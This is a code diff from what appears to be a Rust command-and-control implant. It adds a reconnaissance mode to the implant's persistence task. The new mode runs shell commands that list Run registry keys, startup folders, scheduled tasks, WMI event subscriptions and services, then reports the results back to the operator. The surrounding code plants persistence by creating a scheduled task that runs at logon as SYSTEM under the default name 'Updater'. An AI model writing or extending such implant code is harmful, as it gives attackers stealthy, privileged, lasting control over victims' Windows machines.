@@ -1864,6 +1864,29 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             let name = j.get("name").and_then(|v| v.as_str()).unwrap_or("Updater");
             let cmd2 = j.get("cmd").and_then(|v| v.as_str()).unwrap_or("");
             let meth = j.get("method").and_then(|v| v.as_str()).unwrap_or("registry");
+            if meth == "enum" || meth == "check" || meth == "list" {
+                let mut out2 = String::from("[*] Scanning persistence mechanisms...\n\n");
+                out2.push_str("[HKCU Run]\n");
+                out2.push_str(&shell("reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>&1"));
+                out2.push('\n');
+                out2.push_str("[HKLM Run]\n");
+                out2.push_str(&shell("reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>&1"));
+                out2.push('\n');
+                out2.push_str("[Startup Folder]\n");
+                out2.push_str(&shell("dir \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" 2>&1"));
+                out2.push('\n');
+                out2.push_str("[Scheduled Tasks]\n");
+                out2.push_str(&shell("schtasks /query /fo TABLE /nh 2>&1"));
+                out2.push('\n');
+                out2.push_str("[WMI Subscriptions]\n");
+                out2.push_str(&shell("wmic /namespace:\\\\root\\subscription PATH __EventFilter get Name 2>&1"));
+                out2.push('\n');
+                out2.push_str("[Services (all)]\n");
+                out2.push_str(&shell("sc query type= all state= all 2>&1"));
+                out2.push('\n');
+                t.send_result(task.id, &out2, "");
+                return;
+            }
             if cmd2.is_empty() { t.send_result(task.id, "", "PERSIST requires cmd"); return; }
             let out = if meth == "schtask" {
                 shell(&format!("schtasks /create /tn \"{}\" /tr \"{}\" /sc ONLOGON /ru SYSTEM /f 2>&1", name, cmd2))
